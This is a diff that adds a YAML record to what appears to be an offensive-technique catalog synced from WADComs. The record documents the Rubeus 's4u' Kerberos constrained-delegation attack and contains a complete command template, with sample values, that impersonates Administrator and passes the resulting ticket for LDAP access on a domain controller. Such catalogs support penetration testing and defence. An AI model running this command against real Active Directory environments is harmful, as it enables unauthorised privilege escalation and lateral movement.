@@ -1,0 +1,126 @@
+id: wadcoms/Rubeus-s4u
+type: technique
+platform: active-directory
+name: Rubeus s4u
+phases:
+- execution
+- lateral-movement
+- privilege-escalation
+capabilities:
+- command-execution
+- lateral-movement
+- privilege-escalation
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- an NTLM hash (pass-the-hash)
+- a valid username
+- target
+- service
+commands:
+- template: Rubeus.exe s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator
+    /msdsspn:time/dc.test.local /altservice:ldap /ptt
+  comment: "Rubeus' `s4u` module performs Kerberos constrained delegation attacks using the S4U2Self and\
+    \ S4U2Proxy. This technique abuses accounts configured with delegation privileges (msDS-AllowedToDelegateTo)\
+    \ to impersonate any domain user and further alter the service specified since SPNs are stored in\
+    \ plaintext and thus access any service on the target system as any user\n\nCommand Reference:\n\n\
+    \tDomain: test.local\n\n  SPN: time/dc.test.local\n\n  alternative service: ldap(can chose any valid\
+    \ services such as HTTP for remoting access)\n\n\tUsername: john$\n\n\tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n"
+references:
+- https://github.com/GhostPack/Rubeus
+- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Rubeus-s4u.md
+      document: "\n---\ndescription: |\n  Rubeus' `s4u` module performs Kerberos constrained delegation\
+        \ attacks using the S4U2Self and S4U2Proxy. This technique abuses accounts configured with delegation\
+        \ privileges (msDS-AllowedToDelegateTo) to impersonate any domain user and further alter the service\
+        \ specified since SPNs are stored in plaintext and thus access any service on the target system\
+        \ as any user\n\n  Command Reference:\n\n  \tDomain: test.local\n\n    SPN: time/dc.test.local\n\
+        \n    alternative service: ldap(can chose any valid services such as HTTP for remoting access)\n\
+        \n  \tUsername: john$\n\n  \tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n\ncommand: |\n  Rubeus.exe\
+        \ s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local\
+        \ /altservice:ldap /ptt\nitems:\n  - Hash\n  - Username\n  - target\n  - service\nservices:\n\
+        \  - Kerberos\nOS:\n  - Windows\nattack_types:\n  - Exploitation\n  - Lateral Movement\n  - Privilidge\
+        \ Escalation\nreferences:\n  - https://github.com/GhostPack/Rubeus\n  - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation\n\
+        \  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation\n\
+        ---"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: lateral-movement
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Lateral Movement'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Privilidge Escalation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: lateral-movement
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Lateral Movement'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Privilidge Escalation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:9044368dd9c47f999174766f52d7d4c6a6cb0e85cca6cfcef7665e2a54389bd2
